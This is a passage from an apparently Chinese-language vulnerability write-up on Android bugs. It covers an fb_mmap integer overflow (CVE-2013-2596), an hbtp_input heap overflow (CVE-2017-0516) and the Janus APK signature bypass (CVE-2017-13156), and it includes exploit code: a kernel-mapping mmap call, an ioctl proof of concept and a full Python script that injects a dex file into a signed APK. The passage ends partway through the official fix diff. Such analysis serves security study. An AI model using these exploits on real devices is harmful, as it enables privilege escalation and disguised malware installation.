class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">bool</span></span><br><span class="line">inject_value(struct diag_values *data,</span><br><span class="line">             <span class="keyword">int</span> fd, <span class="keyword">void</span> *delayed_rsp_id_address)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">uint16_t</span> delayed_rsp_id_value = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> i, loop_count, ret;</span><br><span class="line"></span><br><span class="line">  ret = get_current_delayed_rsp_id(fd);</span><br><span class="line">  <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  delayed_rsp_id_value = ret;</span><br><span class="line">  data-&gt;original_value = delayed_rsp_id_value;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (delayed_rsp_id_value &gt; data-&gt;value &amp;&amp;</span><br><span class="line">    reset_delayed_rsp_id(fd, delayed_rsp_id_address) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  loop_count = (data-&gt;value - delayed_rsp_id_value) &amp; <span class="number">0xffff</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; loop_count; i++) &#123;</span><br><span class="line">    <span class="keyword">int</span> unused;</span><br><span class="line">    <span class="keyword">if</span> (send_delay_params(fd, (<span class="keyword">void</span> *)data-&gt;address, &amp;unused) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码中，在 delayed_rsp_id_value 比 data-&gt;value 大的时候，会调用 reset_delayed_rsp_id 重置 delayed_rsp_id 计数为 2，但这个时候，并没有修改局部变量的 delayed_rsp_id_value 为 2，导致后面计算的 loop_count 不正确，因此无法正确的写入值。而且写入值的时候，需要注意控制 0 和 1 的出现。比如写入地址的时候，分配一块地址较高内存进行处理会让利用更稳定一些。</p><h2 id="CVE-2013-2596-libfb-mem-exploit"><a href="#CVE-2013-2596-libfb-mem-exploit" class="headerlink" title="CVE-2013-2596(libfb_mem_exploit)"></a>CVE-2013-2596(libfb_mem_exploit)</h2><h3 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h3><blockquote><p>Integer overflow in the fb_mmap function in drivers/video/fbmem.c in the Linux kernel before 3.8.9, as used in a certain Motorola build of Android 4.1.2 and other products, allows local users to create a read-write memory mapping for the entirety of kernel memory, and consequently gain privileges, via crafted /dev/graphics/fb0 mmap2 system calls, as demonstrated by the Motochopper pwn program.</p></blockquote><p>fb_mmap 函数导致的整数溢出，可以使得用户模式的程序把整个内核以可读写的方式映射到用户模式。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> &#123;</span></span><br><span class="line">    <span class="comment">/* The first cache line has the info for VMA tree walking. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> vm_start;        <span class="comment">/* Our start address within vm_mm. */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> vm_end;        <span class="comment">/* The first byte after our end address</span></span><br><span class="line"><span class="comment">                       within vm_mm. */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* linked list of VM areas per task, sorted by address */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vm_next</span>, *<span class="title">vm_prev</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> <span class="title">vm_rb</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Largest free memory gap in bytes to the left of this VMA.</span></span><br><span class="line"><span class="comment">     * Either between this VMA and vma-&gt;vm_prev, or between one of the</span></span><br><span class="line"><span class="comment">     * VMAs below us in the VMA rbtree and its -&gt;vm_prev. This helps</span></span><br><span class="line"><span class="comment">     * get_unmapped_area find a free area of the right size.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rb_subtree_gap;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Second cache line starts here. */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">vm_mm</span>;</span>    <span class="comment">/* The address space we belong to. */</span></span><br><span class="line">    <span class="keyword">pgprot_t</span> vm_page_prot;        <span class="comment">/* Access permissions of this VMA. */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> vm_flags;        <span class="comment">/* Flags, see mm.h. */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * For areas with an address space and backing store,</span></span><br><span class="line"><span class="comment">     * linkage into the address_space-&gt;i_mmap interval tree, or</span></span><br><span class="line"><span class="comment">     * linkage of vma in the address_space-&gt;i_mmap_nonlinear list.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> <span class="title">rb</span>;</span></span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">long</span> rb_subtree_last;</span><br><span class="line">        &#125; linear;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">nonlinear</span>;</span></span><br><span class="line">    &#125; shared;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * A file's MAP_PRIVATE vma can be in both i_mmap tree and anon_vma</span></span><br><span class="line"><span class="comment">     * list, after a COW of one of the file pages.    A MAP_SHARED vma</span></span><br><span class="line"><span class="comment">     * can only be in the i_mmap tree.  An anonymous MAP_PRIVATE, stack</span></span><br><span class="line"><span class="comment">     * or brk vma (with NULL file) can only be in an anon_vma list.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">anon_vma_chain</span>;</span> <span class="comment">/* Serialized by mmap_sem &amp;</span></span><br><span class="line"><span class="comment">                      * page_table_lock */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">anon_vma</span> *<span class="title">anon_vma</span>;</span>    <span class="comment">/* Serialized by page_table_lock */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Function pointers to deal with this struct. */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> *<span class="title">vm_ops</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Information about our backing store: */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> vm_pgoff;        <span class="comment">/* Offset (within vm_file) in PAGE_SIZE</span></span><br><span class="line"><span class="comment">                       units, *not* PAGE_CACHE_SIZE */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> * <span class="title">vm_file</span>;</span>        <span class="comment">/* File we map to (can be NULL). */</span></span><br><span class="line">    <span class="keyword">void</span> * vm_private_data;        <span class="comment">/* was vm_pte (shared mem) */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_MMU</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_region</span> *<span class="title">vm_region</span>;</span>    <span class="comment">/* NOMMU mapping region */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mempolicy</span> *<span class="title">vm_policy</span>;</span>    <span class="comment">/* NUMA policy for the VMA */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">fb_mmap(struct file *file, struct vm_area_struct * vma)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fb_info</span> *<span class="title">info</span> = <span class="title">file_fb_info</span>(<span class="title">file</span>);</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fb_ops</span> *<span class="title">fb</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> off;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> start;</span><br><span class="line">    u32 len;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!info)</span><br><span class="line">        <span class="keyword">return</span> -ENODEV;</span><br><span class="line">    <span class="keyword">if</span> (vma-&gt;vm_pgoff &gt; (~<span class="number">0U</span>L &gt;&gt; PAGE_SHIFT))</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    off = vma-&gt;vm_pgoff &lt;&lt; PAGE_SHIFT;</span><br><span class="line">    fb = info-&gt;fbops;</span><br><span class="line">    <span class="keyword">if</span> (!fb)</span><br><span class="line">        <span class="keyword">return</span> -ENODEV;</span><br><span class="line">    mutex_lock(&amp;info-&gt;mm_lock);</span><br><span class="line">    <span class="keyword">if</span> (fb-&gt;fb_mmap) &#123;</span><br><span class="line">        <span class="keyword">int</span> res;</span><br><span class="line">        res = fb-&gt;fb_mmap(info, vma);</span><br><span class="line">        mutex_unlock(&amp;info-&gt;mm_lock);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* frame buffer memory */</span></span><br><span class="line">    start = info-&gt;fix.smem_start;</span><br><span class="line">    len = PAGE_ALIGN((start &amp; ~PAGE_MASK) + info-&gt;fix.smem_len);</span><br><span class="line">    <span class="keyword">if</span> (off &gt;= len) &#123;</span><br><span class="line">        <span class="comment">/* memory mapped io */</span></span><br><span class="line">        off -= len;</span><br><span class="line">        <span class="keyword">if</span> (info-&gt;var.accel_flags) &#123;</span><br><span class="line">            mutex_unlock(&amp;info-&gt;mm_lock);</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">        &#125;</span><br><span class="line">        start = info-&gt;fix.mmio_start;</span><br><span class="line">        len = PAGE_ALIGN((start &amp; ~PAGE_MASK) + info-&gt;fix.mmio_len);</span><br><span class="line">    &#125;</span><br><span class="line">    mutex_unlock(&amp;info-&gt;mm_lock);</span><br><span class="line">    start &amp;= PAGE_MASK;</span><br><span class="line">    <span class="comment">// 这里可以控制绕过。</span></span><br><span class="line">    <span class="keyword">if</span> ((vma-&gt;vm_end - vma-&gt;vm_start + off) &gt; len)</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    off += start;</span><br><span class="line">    vma-&gt;vm_pgoff = off &gt;&gt; PAGE_SHIFT;</span><br><span class="line">    <span class="comment">/* VM_IO | VM_DONTEXPAND | VM_DONTDUMP are set by io_remap_pfn_range()*/</span></span><br><span class="line">    vma-&gt;vm_page_prot = vm_get_page_prot(vma-&gt;vm_flags);</span><br><span class="line">    fb_pgprotect(file, vma, off);</span><br><span class="line">    <span class="keyword">if</span> (io_remap_pfn_range(vma, vma-&gt;vm_start, off &gt;&gt; PAGE_SHIFT,</span><br><span class="line">        vma-&gt;vm_end - vma-&gt;vm_start, vma-&gt;vm_page_prot))</span><br><span class="line">        <span class="keyword">return</span> -EAGAIN;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析利用"><a href="#分析利用" class="headerlink" title="分析利用"></a>分析利用</h2><p>vma-&gt;vm_end 和 vma-&gt;vm_start 是 mmap 的前两个参数，描述了要映射到的地址范围，vm_end - vm_start 得到的是要映射的 size，代码中用 size + off 判断要映射的大小是否在 len 之内。这三个值都是可以控制的，通过控制这三个值产生整数溢出，绕过判断。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mapped_address = mmap((<span class="keyword">void</span> *)MAPPED_BASE, (<span class="number">0x100000000</span> - kernel_phys_address),</span><br><span class="line">                        PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,</span><br><span class="line">                        *fd, kernel_phys_address + info.smem_len);</span><br></pre></td></tr></table></figure><p>MAPPED_BASE 是固定的值，为 0x20000000，即要映射的地址。size 上用一个大于 32 位的数减去了内核基地址。<br>off 是用内核地址加上了 smem_len。</p><h2 id="CVE-2017-0516"><a href="#CVE-2017-0516" class="headerlink" title="CVE-2017-0516"></a>CVE-2017-0516</h2><h3 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h3><blockquote><p>hbtp_input 的驱动在处理 HBTP_SET_ABSPARAM 时没有对下标进行有效的范围判断，导致下标溢出，进而导致堆溢出，此时用户态程序获得堆数据写入的机会。</p></blockquote><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ABS_MAX                 0x3f</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ABS_CNT                 (ABS_MAX+1)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input_set_abs_params</span><span class="params">(struct input_dev *dev, <span class="keyword">unsigned</span> <span class="keyword">int</span> axis,</span></span></span><br><span class="line"><span class="function"><span class="params">                          <span class="keyword">int</span> min, <span class="keyword">int</span> max, <span class="keyword">int</span> fuzz, <span class="keyword">int</span> flat)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">input_absinfo</span> *<span class="title">absinfo</span>;</span></span><br><span class="line"></span><br><span class="line">    input_alloc_absinfo(dev);</span><br><span class="line">    <span class="keyword">if</span> (!dev-&gt;absinfo)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    absinfo = &amp;dev-&gt;absinfo[axis];  <span class="comment">// Notice</span></span><br><span class="line">    absinfo-&gt;minimum = min;</span><br><span class="line">    absinfo-&gt;maximum = max;</span><br><span class="line">    absinfo-&gt;fuzz = fuzz;</span><br><span class="line">    absinfo-&gt;flat = flat;</span><br><span class="line"></span><br><span class="line">    __set_bit(EV_ABS, dev-&gt;evbit);</span><br><span class="line">    __set_bit(axis, dev-&gt;absbit);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(input_set_abs_params);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= ABS_MT_LAST - ABS_MT_FIRST; i++) &#123;</span><br><span class="line">    <span class="built_in">abs</span> = absinfo + i;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">abs</span>-&gt;active)</span><br><span class="line">        input_set_abs_params(input_dev, <span class="built_in">abs</span>-&gt;code,</span><br><span class="line">                <span class="built_in">abs</span>-&gt;minimum, <span class="built_in">abs</span>-&gt;maximum, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>absinfo 为 struct hbtp_input_absinfo* 数组，每次取出一个 abs 后，调用 input_set_abs_params 给 input_dev 赋值。axis 被当作了下标来处理，axis 来自 abs-&gt;code，用户态可控。所以，用户态程序可以使之访问到其他内存，并能够通过 abs-&gt;minimum 和 abs-&gt;maximum 写入 max 和 min。</p><h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hbtp_input_absinfo</span> <span class="title">absinfo</span>[<span class="title">ABS_MT_LAST</span> - <span class="title">ABS_MT_FIRST</span> + 1] = &#123;</span> <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">int</span> fd = getfd(dev);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ABS_MT_LAST - ABS_MT_FIRST + <span class="number">1</span>; i++) &#123;</span><br><span class="line">        absinfo[i].active = <span class="number">1</span>;</span><br><span class="line">        absinfo[i].code = <span class="number">0xFFFF</span> - i;</span><br><span class="line">        absinfo[i].minimum = <span class="number">0xAAAAAAAA</span>;</span><br><span class="line">        absinfo[i].maximum = <span class="number">0xAAAAAAAA</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">        ioctl(fd, HBTP_SET_ABSPARAM, absinfo);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://github.com/ScottyBauer/Android_Kernel_CVE_POCs/blob/master/CVE-2017-0516.c">POC来自这里</a></p><h2 id="Janus签名漏洞-CVE-2017-13156"><a href="#Janus签名漏洞-CVE-2017-13156" class="headerlink" title="Janus签名漏洞(CVE-2017-13156)"></a>Janus签名漏洞(CVE-2017-13156)</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Android4.4 以后引入 art虚拟机，相比只能执行 apk 的 dvm，art 既可以执行 apk，也可以执行优化后的 dex，通过魔数来区分。</p><p>Zip 文件的读取方式是读文件末尾定位的 central directory，然后通过里面的索引定位到各个 zip entry，每个 entry 解压之后都对应一个文件。ParseZipArchive 函数在进行以上处理时候并没有判断文件头部的魔数是否为504B0304(即Zip)。</p><p>因此根据以上两点，攻击者可以通过将恶意 dex 文件放到 apk 文件的头部，在系统安装 apk 文件时，系统安装器解压 zip 时并没有先判断 apk 文件的头部 magic 字段，直接默认是 apk(zip) 文件，从而直接从文件尾部进行读取解压，此时签名没有任何变化，因此可欺骗系统，进行安装。</p><p>在用户运行 apk 时，ART 虚拟机会去判断文件头部的 magic 字段，从而执行恶意 dex。</p><h3 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> zlib <span class="keyword">import</span> adler32</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_checksum</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    生成sha1 hash</span></span><br><span class="line"><span class="string">    "&lt;L" 小端存储unsigned long</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    m = hashlib.sha1()</span><br><span class="line">    m.update(data[<span class="number">32</span>:])</span><br><span class="line">    data[<span class="number">12</span>:<span class="number">12</span>+<span class="number">20</span>] = m.digest()</span><br><span class="line">    v = adler32(buffer(data[<span class="number">12</span>:])) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    data[<span class="number">8</span>:<span class="number">12</span>] = struct.pack(<span class="string">"&lt;L"</span>, v)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        print(<span class="string">"usage: %s dex apk out_apk"</span> % __file__)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    _, dex, apk, out_apk = sys.argv</span><br><span class="line">    <span class="keyword">with</span> open(dex, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        dex_data = bytearray(f.read())</span><br><span class="line">    dex_size = len(dex_data)</span><br><span class="line">    <span class="keyword">with</span> open(apk, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        apk_data = bytearray(f.read())</span><br><span class="line">    cd_end_addr = apk_data.rfind(<span class="string">'\x50\x4b\x05\x06'</span>)</span><br><span class="line">    cd_start_addr = struct.unpack(<span class="string">"&lt;L"</span>, apk_data[cd_end_addr+<span class="number">16</span>:cd_end_addr+<span class="number">20</span>])[<span class="number">0</span>]</span><br><span class="line">    apk_data[cd_end_addr+<span class="number">16</span>:cd_end_addr+<span class="number">20</span>] = struct.pack(<span class="string">"&lt;L"</span>, cd_start_addr+dex_size)</span><br><span class="line">    pos = cd_start_addr</span><br><span class="line">    <span class="keyword">while</span> (pos &lt; cd_end_addr):</span><br><span class="line">        offset = struct.unpack(<span class="string">"&lt;L"</span>, apk_data[pos+<span class="number">42</span>:pos+<span class="number">46</span>])[<span class="number">0</span>]</span><br><span class="line">        apk_data[pos+<span class="number">42</span>:pos+<span class="number">46</span>] = struct.pack(<span class="string">"&lt;L"</span>, offset+dex_size)</span><br><span class="line">        pos = apk_data.find(<span class="string">"\x50\x4b\x01\x02"</span>, pos+<span class="number">46</span>, cd_end_addr)</span><br><span class="line">        <span class="keyword">if</span> pos == <span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    out_data = dex_data + apk_data</span><br><span class="line">    out_data[<span class="number">32</span>:<span class="number">36</span>] = struct.pack(<span class="string">"&lt;L"</span>, len(out_data))</span><br><span class="line">    update_checksum(out_data)</span><br><span class="line">    <span class="keyword">with</span> open(out_apk, <span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(out_data)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'%s generated'</span> % out_apk)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="官方修复"><a href="#官方修复" class="headerlink" title="官方修复"></a>官方修复</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/libziparchive/zip_archive.cc b/libziparchive/zip_archive.cc</span><br><span class="line">index <span class="number">78</span>de40a..d0bbd72 <span class="number">100644</span></span><br><span class="line">--- a/libziparchive/zip_archive.cc</span><br><span class="line">+++ b/libziparchive/zip_archive.cc</span><br><span class="line">@@ <span class="number">-441</span>,<span class="number">6</span> +<span class="number">441</span>,<span class="number">22</span> @@</span><br><span class="line">       <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">+</span><br><span class="line">+  <span class="keyword">uint32_t</span> lfh_start_bytes;</span><br><span class="line">+  <span class="comment">//读取zip头部信息</span></span><br><span class="line">+  <span class="keyword">if</span> (!archive-&gt;mapped_zip.ReadAtOffset(<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">uint8_t</span>*&gt;(&amp;lfh_start_bytes),</span><br><span class="line">+                                        <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>), <span class="number">0</span>)) &#123;</span><br><span class="line">+    ALOGW(<span class="string">"Zip: Unable to read header for entry at offset == 0."</span>);</span><br><span class="line">+    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">+  &#125;</span><br><span class="line">+</span><br><span class="line">   <span class="comment">//增加kSignature头部验证，不同时返回-1</span></span><br><span class="line">+  <span class="keyword">if</span> (lfh_start_bytes != LocalFileHeader::kSignature) &#123;</span><br><span class="line">+    ALOGW(<span class="string">"Zip: Entry at offset zero has invalid LFH signature %"</span> PRIx32, lfh_start_bytes);</span><br><span class="line">+  <span class="meta">#<span class="meta-keyword">if</span> 